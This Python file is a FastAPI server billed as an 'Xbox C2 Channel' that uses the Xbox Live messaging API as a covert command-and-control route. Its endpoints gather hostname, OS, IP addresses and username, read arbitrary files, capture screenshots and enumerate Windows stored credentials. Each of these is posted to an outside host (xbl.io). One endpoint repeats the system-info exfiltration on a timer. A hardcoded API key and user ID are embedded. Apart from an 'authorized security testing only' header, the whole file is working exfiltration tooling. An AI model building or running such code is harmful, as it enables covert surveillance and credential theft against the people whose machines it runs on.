# File: xbox_c2_api.py
# Complete Xbox C2 API - Production Ready
# For authorized security testing only

import os
import json
import time
import base64
import socket
import platform
import asyncio
from datetime import datetime
from typing import Dict, Any, Optional, List
from contextlib import asynccontextmanager

# FastAPI imports
from fastapi import FastAPI, HTTPException, Depends, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import APIKeyHeader
from pydantic import BaseModel

# HTTP and system
import requests
import psutil

# Environment variables
API_KEY = os.environ.get("C2_API_KEY", "your-secure-api-key-change-me")
XBOX_API_KEY = os.environ.get("XBOX_API_KEY", "598296f2-1cf0-42e9-bdd4-d0c63db1d532")
DEFAULT_XUID = os.environ.get("DEFAULT_XUID", "2535473210914202")
PORT = int(os.environ.get("PORT", 8000))

# Constants
XBOX_API_BASE = "https://xbl.io"
XBOX_API_PATH = "/api/v2/conversations"

# ============================================================================
# Pydantic Models
# ============================================================================

class ExfiltrateRequest(BaseModel):
    data: str
    xuid: Optional[str] = DEFAULT_XUID

class FileExfilRequest(BaseModel):
    filepath: str
    xuid: Optional[str] = DEFAULT_XUID

class MonitorRequest(BaseModel):
    xuid: Optional[str] = DEFAULT_XUID
    interval: int = 60

# ============================================================================
# Xbox C2 Client
# ============================================================================

class XboxC2Client:
    """Complete Xbox C2 Channel Implementation"""
    
    def __init__(self, api_key: str = XBOX_API_KEY, xuid: str = DEFAULT_XUID):
        self.api_key = api_key
        self.default_xuid = xuid
        self.session = requests.Session()
        self.call_history = []
        self._setup_session()
    
    def _setup_session(self):
        self.session.headers.update({
            "User-Agent": "Windows/10.0 (compatible; XboxApp)",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Authorization": self.api_key
        })
    
    def get_timestamp(self) -> str:
        return datetime.now().isoformat()
    
    def collect_system_info(self) -> Dict[str, Any]:
        info = {
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_total": psutil.virtual_memory().total,
            "memory_available": psutil.virtual_memory().available,
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": {},
            "ip_addresses": [],
            "username": os.getlogin() if os.name == 'nt' else os.getenv('USER'),
            "timestamp": datetime.now().isoformat()
        }
        
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info["disk_usage"][partition.mountpoint] = {
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent
                }
            except:
                pass
        
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if '.' in addr.address:
                    info["ip_addresses"].append(addr.address)
        
        return info
    
    def format_system_info(self, info: Dict[str, Any]) -> str:
        return (
            f"Host: {info['hostname']} | "
            f"OS: {info['os']} | "
            f"Arch: {info['arch']} | "
            f"CPU: {info['cpu_count']} cores | "
            f"RAM: {info['memory_percent']:.1f}% | "
            f"IPs: {', '.join(info['ip_addresses'][:3])}"
        )
    
    def exfiltrate_to_xbox(self, data: str, xuid: Optional[str] = None) -> bool:
        if xuid is None:
            xuid = self.default_xuid
        
        try:
            payload = {"message": data, "xuid": xuid}
            url = f"{XBOX_API_BASE}{XBOX_API_PATH}"
            
            response = self.session.post(url, json=payload, timeout=30)
            
            self.call_history.append({
                "timestamp": datetime.now().isoformat(),
                "xuid": xuid,
                "data_length": len(data),
                "status_code": response.status_code,
                "success": response.status_code == 200
            })
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"Exfiltration error: {e}")
            return False
    
    def exfiltrate_system_info(self, xuid: Optional[str] = None) -> bool:
        info = self.collect_system_info()
        formatted = self.format_system_info(info)
        return self.exfiltrate_to_xbox(formatted, xuid)
    
    def exfiltrate_file(self, filepath: str, xuid: Optional[str] = None) -> bool:
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            filename = os.path.basename(filepath)
            encoded = base64.b64encode(data).decode('ascii')
            payload = f"FILE:{filename}:{len(data)}:{encoded[:500]}..."
            return self.exfiltrate_to_xbox(payload, xuid)
            
        except Exception as e:
            print(f"File exfiltration error: {e}")
            return False
    
    def exfiltrate_screenshot(self, xuid: Optional[str] = None) -> bool:
        try:
            import PIL.ImageGrab
            screenshot = PIL.ImageGrab.grab()
            import io
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_data = base64.b64encode(img_bytes.getvalue()).decode('ascii')
            payload = f"SCREENSHOT:{len(img_data)}:{img_data[:500]}..."
            return self.exfiltrate_to_xbox(payload, xuid)
            
        except Exception as e:
            print(f"Screenshot error: {e}")
            return False
    
    def exfiltrate_credentials(self, xuid: Optional[str] = None) -> bool:
        credentials = []
        
        if os.name == 'nt':
            try:
                import win32cred
                for cred in win32cred.CredEnumerate(None, 0):
                    credentials.append({
                        "target": cred.get("TargetName", ""),
                        "username": cred.get("UserName", "")
                    })
            except:
                pass
        
        if credentials:
            payload = json.dumps({
                "type": "CREDENTIALS",
                "count": len(credentials),
                "data": credentials[:5]
            })
            return self.exfiltrate_to_xbox(payload, xuid)
        
        return False
    
    def get_stats(self) -> Dict:
        successful = sum(1 for c in self.call_history if c["success"])
        total = len(self.call_history)
        
        return {
            "total_calls": total,
            "successful": successful,
            "failed": total - successful,
            "success_rate": (successful / total * 100) if total > 0 else 0,
            "recent_calls": self.call_history[-5:] if total > 0 else []
        }

# Global client
c2_client = XboxC2Client()

# ============================================================================
# FastAPI Application
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("🚀 Xbox C2 API Starting...")
    print(f"🔑 API Key: {API_KEY[:10]}...")
    print(f"🎯 Default XUID: {DEFAULT_XUID}")
    yield
    print("🛑 Xbox C2 API Shutting down...")

app = FastAPI(
    title="Xbox C2 Channel API",
    description="Reverse engineered C2 channel via Xbox Live API",
    version="1.0.0",
    lifespan=lifespan
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Security
api_key_header = APIKeyHeader(name="X-Authorization", auto_error=False)

async def verify_api_key(api_key: str = Depends(api_key_header)):
    if not api_key or api_key != API_KEY:
        raise HTTPException(status_code=403, detail="Invalid or missing API Key")
    return api_key

# ============================================================================
# Endpoints
# ============================================================================

@app.get("/")
async def root():
    return {
        "service": "Xbox C2 Channel",
        "version": "1.0.0",
        "docs": "/docs",
        "endpoints": {
            "GET /health": "Health check",
            "POST /c2/exfiltrate": "Exfiltrate data",
            "POST /c2/system": "Exfiltrate system info",
            "POST /c2/file": "Exfiltrate file",
            "POST /c2/credentials": "Exfiltrate credentials",
            "POST /c2/screenshot": "Exfiltrate screenshot",
            "GET /c2/stats": "Get exfiltration stats",
            "POST /c2/monitor/start": "Start continuous monitoring",
            "POST /c2/monitor/stop": "Stop monitoring"
        }
    }

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "service": "Xbox C2 Channel",
        "timestamp": datetime.now().isoformat()
    }

@app.post("/c2/exfiltrate")
async def exfiltrate_data(
    request: ExfiltrateRequest,
    api_key: str = Depends(verify_api_key)
):
    try:
        success = c2_client.exfiltrate_to_xbox(request.data, request.xuid)
        return {
            "status": "success" if success else "failed",
            "message": "Data exfiltrated successfully" if success else "Exfiltration failed",
            "data_length": len(request.data),
            "xuid": request.xuid,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/c2/system")
async def exfiltrate_system_info(
    xuid: Optional[str] = Query(DEFAULT_XUID),
    api_key: str = Depends(verify_api_key)
):
    try:
        info = c2_client.collect_system_info()
        formatted = c2_client.format_system_info(info)
        success = c2_client.exfiltrate_to_xbox(formatted, xuid)
        
        return {
            "status": "success" if success else "failed",
            "system_info": info,
            "formatted": formatted,
            "xuid": xuid,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/c2/file")
async def exfiltrate_file(
    request: FileExfilRequest,
    api_key: str = Depends(verify_api_key)
):
    try:
        success = c2_client.exfiltrate_file(request.filepath, request.xuid)
        return {
            "status": "success" if success else "failed",
            "filepath": request.filepath,
            "xuid": request.xuid,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/c2/credentials")
async def exfiltrate_credentials(
    xuid: Optional[str] = Query(DEFAULT_XUID),
    api_key: str = Depends(verify_api_key)
):
    try:
        success = c2_client.exfiltrate_credentials(xuid)
        return {
            "status": "success" if success else "failed",
            "xuid": xuid,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/c2/screenshot")
async def exfiltrate_screenshot(
    xuid: Optional[str] = Query(DEFAULT_XUID),
    api_key: str = Depends(verify_api_key)
):
    try:
        success = c2_client.exfiltrate_screenshot(xuid)
        return {
            "status": "success" if success else "failed",
            "xuid": xuid,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/c2/stats")
async def get_stats(
    api_key: str = Depends(verify_api_key)
):
    try:
        stats = c2_client.get_stats()
        return {
            "status": "success",
            "stats": stats,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Monitoring tasks
monitor_tasks = {}

@app.post("/c2/monitor/start")
async def start_monitoring(
    request: MonitorRequest,
    background_tasks: BackgroundTasks,
    api_key: str = Depends(verify_api_key)
):
    global monitor_tasks
    
    task_id = f"monitor_{int(time.time())}"
    
    async def monitor_task():
        xuid = request.xuid
        interval = request.interval
        print(f"🔄 Starting monitoring to {xuid} every {interval}s")
        
        while True:
            try:
                success = c2_client.exfiltrate_system_info(xuid)
                status = "✅" if success else "❌"
                print(f"{status} [{datetime.now().isoformat()}] Exfiltration {'successful' if success else 'failed'}")
                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                print(f"🛑 Monitoring task {task_id} cancelled")
                break
            except Exception as e:
                print(f"❌ Monitor error: {e}")
                await asyncio.sleep(interval)
    
    task = asyncio.create_task(monitor_task())
    monitor_tasks[task_id] = task
    
    return {
        "status": "success",
        "task_id": task_id,
        "xuid": request.xuid,
        "interval": request.interval,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/c2/monitor/stop")
async def stop_monitoring(
    task_id: str = Query(...),
    api_key: str = Depends(verify_api_key)
):
    global monitor_tasks
    
    if task_id in monitor_tasks:
        monitor_tasks[task_id].cancel()
        del monitor_tasks[task_id]
        return {
            "status": "success",
            "task_id": task_id,
            "timestamp": datetime.now().isoformat()
        }
    
    raise HTTPException(status_code=404, detail=f"Task {task_id} not found")

if __name__ == "__main__":
    import uvicorn
    print("=" * 60)
    print("XBOX C2 API SERVER")
    print("=" * 60)
    print(f"API Key: {API_KEY}")
    print(f"Default XUID: {DEFAULT_XUID}")
    print(f"Port: {PORT}")
    print("=" * 60)
    uvicorn.run(app, host="0.0.0.0", port=PORT)
